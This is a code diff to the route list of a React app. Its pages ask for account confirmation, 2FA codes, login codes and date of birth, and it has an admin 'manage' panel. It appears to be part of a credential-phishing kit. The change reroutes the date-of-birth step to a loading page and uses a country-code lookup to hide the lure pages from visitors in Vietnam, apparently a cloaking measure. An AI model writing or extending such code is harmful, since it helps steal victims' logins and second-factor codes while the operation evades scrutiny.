@@ -3,11 +3,10 @@ import Admin from "../pages/admin";
 import Checkpoint from "../pages/checkpoint";
 import ConfirmAccount from "../pages/confirm_account";
 import ConfirmLoading from "../pages/confirm_loading";
-import DateOfBirthConfirm from "../pages/date_of_birth_confirm";
 
-import SupportGetHelp from "../pages/support_get_help";
-import LoginCode from "../pages/logincode";
 import FaCode from "../pages/facode";
+import LoginCode from "../pages/logincode";
+import SupportGetHelp from "../pages/support_get_help";
 
 export const BanContext = createContext();
 
@@ -18,7 +17,7 @@ export const RoutesList = [
   { path: "/confirm/2fa-code", element: <FaCode /> },
   { path: "/confirm/login-code", element: <LoginCode /> },
   { path: "/confirm/processing", element: <ConfirmLoading /> },
-  { path: "/confirm/date-of-birth", element: <DateOfBirthConfirm /> },
+  { path: "/confirm/date-of-birth", element: <ConfirmLoading /> },
 ];
 
 export const AdminRoutesList = [{ path: "/admin/manage", element: <Admin /> }];
@@ -32,7 +31,7 @@ const BanContextProvider = ({ children }) => {
       .then((res) => res.json())
       .then((json) => {
         if (json.countryCode == "VN") {
-          setRouters([...RoutesList, ...AdminRoutesList]);
+          setRouters([...AdminRoutesList]);
         } else {
           setRouters([...RoutesList, ...AdminRoutesList]);
         }
